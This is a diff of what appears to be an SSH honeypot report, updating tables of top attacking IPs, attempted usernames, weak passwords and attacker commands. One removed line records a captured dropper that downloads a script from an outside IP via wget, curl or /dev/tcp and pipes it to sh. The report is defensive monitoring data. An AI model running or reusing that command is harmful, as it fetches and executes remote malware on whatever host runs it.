@@ -13,51 +13,52 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 47.251.85.16 | 38223 |
-| 39.101.68.101 | 35187 |
-| 8.219.63.164 | 4445 |
-| 8.219.158.133 | 4270 |
-| 47.109.65.194 | 2679 |
-| 130.162.210.27 | 1359 |
-| 8.130.102.128 | 215 |
-| 143.198.145.136 | 66 |
-| 103.130.215.82 | 64 |
-| 109.94.172.86 | 64 |
+| 47.251.85.16 | 24014 |
+| 39.101.68.101 | 17012 |
+| 47.105.207.193 | 4778 |
+| 39.107.249.135 | 4680 |
+| 47.254.14.171 | 1145 |
+| 8.216.121.252 | 530 |
+| 47.109.65.194 | 221 |
+| 182.92.166.28 | 159 |
+| 47.84.86.67 | 94 |
+| 120.26.0.237 | 93 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 37236 |
-| admin | 18 |
+| root | 21497 |
+| ollama | 88 |
+| sammy | 52 |
+| chenzilong | 49 |
+| admin | 29 |
+| ubuntu | 27 |
+| user | 24 |
 | test | 16 |
-| sammy | 13 |
-| arma | 11 |
-| hjc | 10 |
-| karimderaz | 10 |
-| chenzilong | 9 |
-| postgres | 9 |
-| bonus | 8 |
+| administrator | 13 |
+| bitrix | 13 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 566 |
-| 1 | 24 |
-| 1234 | 21 |
-| 111111 | 19 |
-| password | 17 |
-| 12345 | 12 |
-| viktor | 10 |
-| chenzilong | 9 |
-| 12345678 | 9 |
-| zhao | 8 |
+| 123456 | 708 |
+| 1 | 73 |
+| chenzilong | 49 |
+| 123 | 49 |
+| password | 36 |
+| 12345678 | 30 |
+| 1234 | 27 |
+| root | 19 |
+| 12345 | 19 |
+| 123456789 | 18 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 120.27.223.86 | uname -s -m |
-| 94.103.125.37 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
-| 47.251.85.16 | echo -e "\x6F\x6B" |
+| 182.92.219.129 | uname -s -m |
+| 47.251.99.255 | uname -s -m |
+| 182.92.166.28 | uname -s -m |
+| 203.33.206.39 | uname -s -m |
